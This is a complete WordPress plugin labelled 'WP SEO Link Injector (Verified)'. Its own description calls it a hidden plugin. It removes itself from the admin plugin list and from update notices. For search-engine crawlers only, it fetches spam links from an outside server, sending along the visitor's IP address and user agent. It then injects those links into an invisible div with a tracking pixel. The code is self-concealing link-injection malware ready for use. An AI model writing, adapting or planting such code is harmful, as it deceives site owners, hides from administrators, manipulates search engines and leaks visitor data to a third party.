<?php
/*
Plugin Name: WP SEO Link Injector (Verified)
Description: Скрытый плагин, который запрашивает ссылки для ботов и передаёт оригинальный IP/UA.
Version: 1.0.0
Author: Index Service
*/

if (!defined('ABSPATH')) {
    exit;
}

define('IVQ_SEO_PLUGIN_ENDPOINT', 'https://ivoque.de/api/generate-for-bots.php');
define('IVQ_SEO_PIXEL_ENDPOINT', 'https://ivoque.de/api/bot-pixel.php');
define('IVQ_SEO_PLUGIN_SECRET', 'CHANGE_ME_SECRET');

add_action('init', function () {
    remove_action('wp_head', 'rsd_link');
    remove_action('wp_head', 'wlwmanifest_link');
});

add_action('template_redirect', function () {
    if (is_feed()) {
        remove_action('wp_head', 'feed_links', 2);
        remove_action('wp_head', 'feed_links_extra', 3);
    }
});

add_filter('all_plugins', function ($plugins) {
    unset($plugins[plugin_basename(__FILE__)]);
    return $plugins;
});
add_filter('site_transient_update_plugins', function ($value) {
    if (is_object($value) && isset($value->response) && is_array($value->response)) {
        $slug = plugin_basename(__FILE__);
        if (array_key_exists($slug, $value->response)) {
            unset($value->response[$slug]);
        }
    }
    return $value;
});
add_filter('network_site_transient_update_plugins', function ($value) {
    if (is_object($value) && isset($value->response) && is_array($value->response)) {
        $slug = plugin_basename(__FILE__);
        if (array_key_exists($slug, $value->response)) {
            unset($value->response[$slug]);
        }
    }
    return $value;
});

function ivq_detect_bot(): ?string
{
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    return match (true) {
        str_contains($ua, 'googlebot') => 'Googlebot',
        str_contains($ua, 'bingbot') || str_contains($ua, 'bingpreview') => 'Bingbot',
        str_contains($ua, 'yandex') => 'YandexBot',
        default => null,
    };
}

function ivq_get_ip(): string
{
    $candidates = [
        $_SERVER['HTTP_CF_CONNECTING_IP'] ?? '',
        $_SERVER['HTTP_X_REAL_IP'] ?? '',
        $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '',
        $_SERVER['REMOTE_ADDR'] ?? '',
    ];
    foreach ($candidates as $ip) {
        $ip = trim((string)$ip);
        if ($ip === '') { continue; }
        if (str_contains($ip, ',')) {
            $ip = trim(explode(',', $ip)[0]);
        }
        if (filter_var($ip, FILTER_VALIDATE_IP)) {
            return $ip;
        }
    }
    return '0.0.0.0';
}

function ivq_fetch_links(string $bot, string $pageUrl, int $count = 10): array
{
    $endpoint = IVQ_SEO_PLUGIN_ENDPOINT . '?bot=' . rawurlencode($bot) . '&count=' . $count . '&page=' . rawurlencode($pageUrl);
    $args = [
        'timeout' => 10,
        'headers' => [
            'X-Plugin-Secret' => IVQ_SEO_PLUGIN_SECRET,
            'X-Visitor-IP' => ivq_get_ip(),
            'X-Visitor-UA' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        ],
    ];
    $resp = wp_remote_get($endpoint, $args);
    if (is_wp_error($resp)) {
        return [];
    }
    $code = (int)wp_remote_retrieve_response_code($resp);
    if ($code !== 200) {
        return [];
    }
    $body = wp_remote_retrieve_body($resp);
    $json = json_decode($body, true);
    if (!is_array($json) || ($json['status'] ?? '') !== 'success') {
        return [];
    }
    return $json['links'] ?? [];
}

function ivq_render_links(): void
{
    if (!is_single() && !is_page()) {
        return;
    }
    $bot = ivq_detect_bot();
    if ($bot === null) {
        return;
    }
    $pageUrl = get_permalink();
    $links = ivq_fetch_links($bot, $pageUrl, 20);
    if (!$links) {
        return;
    }
    echo "<!-- IVQ SEO Links -->\n";
    echo '<div style="height:0;width:0;overflow:hidden;">';
    foreach ($links as $item) {
        $url = esc_url($item['url'] ?? '');
        $anchor = esc_html($item['anchor'] ?? $url);
        if ($url === '') { continue; }
        echo '<a href="' . $url . '" rel="nofollow">' . $anchor . '</a>';
    }
    $pixel = add_query_arg([
        'page' => rawurlencode($pageUrl),
        'bot' => $bot,
    ], IVQ_SEO_PIXEL_ENDPOINT);
    echo '<img src="' . esc_url($pixel) . '" alt="" width="1" height="1" style="display:none;" />';
    echo '</div>';
}
add_action('wp_footer', 'ivq_render_links', 1000);

?>
